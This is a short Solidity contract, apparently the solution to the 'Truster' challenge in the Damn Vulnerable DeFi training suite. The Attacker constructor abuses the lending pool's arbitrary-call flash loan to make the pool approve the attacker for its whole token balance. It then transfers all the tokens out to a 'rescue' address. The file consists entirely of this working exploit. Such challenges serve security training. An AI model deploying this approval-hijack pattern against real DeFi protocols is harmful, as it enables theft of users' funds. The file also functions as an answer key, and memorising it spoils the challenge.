// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract Attacker {
    constructor(address pool, address token, address rescue) {
        // Use the flashloan to approve the attacker contract to transfer all the tokens
        TrusterLenderPool(pool).flashLoan(
            0,
            address(this),
            token,
            abi.encodeWithSignature("approve(address,uint256)", address(this), DamnValuableToken(token).balanceOf(pool))
        );
        // Transfer all the tokens to the rescue address
        DamnValuableToken(token).transferFrom(pool, rescue, DamnValuableToken(token).balanceOf(pool));
    }
}
